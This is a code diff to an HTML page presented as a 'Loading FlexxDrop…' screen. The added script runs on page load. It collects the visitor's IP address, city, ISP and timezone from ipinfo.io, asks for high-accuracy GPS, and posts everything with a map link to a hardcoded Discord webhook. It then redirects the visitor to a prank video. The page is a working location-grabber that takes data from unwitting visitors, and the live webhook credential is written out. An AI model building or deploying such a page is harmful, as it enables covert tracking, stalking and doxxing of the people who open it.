@@ -23,15 +23,27 @@
   <div>Loading FlexxDrop…</div>
 
   <script>
-    // 🔁 Replace this with your actual Discord webhook
     const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
+    const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
-    // 🔁 Replace this with where you want the person to be redirected after GPS is captured
-    const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Optional: change this or leave it
-
-    function sendToDiscord(lat, lon, acc) {
+    function sendToDiscord(lat, lon, acc, ipData) {
+      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
       const payload = {
-        content: `📍 **GPS Captured**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${acc}m\n🕒 ${new Date().toLocaleString()}`
+        content: `📍 **GPS Captured**  
+**Latitude:** ${lat}  
+**Longitude:** ${lon}  
+**Accuracy:** ${acc} meters  
+**Map:** ${mapLink}
+
+🌐 **IP Info**  
+**IP:** ${ipData.ip}  
+**City:** ${ipData.city}  
+**Region:** ${ipData.region}  
+**Country:** ${ipData.country}  
+**ISP:** ${ipData.org}  
+**Timezone:** ${ipData.timezone}
+
+🕒 ${new Date().toLocaleString()}`
       };
 
       fetch(webhookUrl, {
@@ -40,43 +52,43 @@
         body: JSON.stringify(payload)
       });
 
-      // Optional: redirect after 1 second
       setTimeout(() => {
         window.location.href = redirectUrl;
       }, 1000);
     }
 
-    function getGPS() {
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const acc = pos.coords.accuracy;
+    function getIPAndGPS() {
+      fetch("https://ipinfo.io/json?token=tryit")
+        .then(res => res.json())
+        .then(ipData => {
+          if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+              (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy;
 
-            console.log("Lat:", lat);
-            console.log("Lon:", lon);
-            console.log("Accuracy:", acc);
+                console.log("Lat:", lat);
+                console.log("Lon:", lon);
+                console.log("Accuracy:", acc);
 
-            sendToDiscord(lat, lon, acc);
-          },
-          (err) => {
-            console.error("GPS error:", err.message);
-            // Optional: close tab or redirect if denied
-            window.location.href = "about:blank";
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
+                sendToDiscord(lat, lon, acc, ipData);
+              },
+              (err) => {
+                console.error("GPS error:", err.message);
+                window.location.href = "about:blank";
+              },
+              {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+              }
+            );
           }
-        );
-      } else {
-        console.warn("Geolocation not supported.");
-      }
+        });
     }
 
-    window.onload = getGPS;
+    window.onload = getIPAndGPS;
   </script>
 </body>
 </html>
